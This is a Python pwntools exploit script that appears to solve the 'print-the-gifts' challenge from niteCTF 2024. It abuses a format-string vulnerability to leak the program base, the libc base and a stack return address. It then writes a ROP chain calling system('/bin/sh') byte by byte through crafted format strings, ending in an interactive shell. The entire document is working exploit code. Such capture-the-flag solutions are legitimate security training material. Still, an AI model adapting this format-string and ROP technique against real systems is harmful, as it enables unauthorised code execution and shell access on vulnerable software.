#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("print-the-gifts.chals.nitectf2024.live", 1337, ssl=True)

    return r


def main():
    r = conn()

    offset_buf = 8
    offset_ret = 23

    # PIE base leak
    r.sendlineafter('>', '%25$p')
    r.recvuntil('you a ')
    leak = int(r.recvline().decode().strip('\n'), 16)
    log.info('leak, %#x', leak)
    exe.address = leak - 0x1199
    log.info('base, %#x', exe.address)

    r.sendlineafter(':\n', 'y')

    # libc base leak
    r.sendlineafter('>', '%43$p')
    r.recvuntil('you a ')
    leak = int(r.recvline().decode().strip('\n'), 16)
    log.info('leak, %#x', leak)
    libc.address = leak - 0x27305
    log.info('libc base, %#x', libc.address)

    r.sendlineafter(':\n', 'y')

    # Return address leak
    r.sendlineafter('>', '%1$p')
    r.recvuntil('you a ')
    retaddr = int(r.recvline().decode().strip('\n'), 16) + 0x21a8
     
    rop = ROP(libc)
    rop.rdi = next(libc.search(b'/bin/sh\x00'))
    rop.raw(rop.find_gadget(['ret']).address)
    rop.call('system')
    payload = rop.chain()

    for i in range(len(payload)):
        r.sendlineafter(b'y or n:\n', b'y')
        r.sendlineafter(">", fmtstr_payload(8, {retaddr + i: p8(payload[i])}))

    r.sendlineafter(b'y or n:\n', b'n')

    r.interactive()

if __name__ == "__main__":
    main()

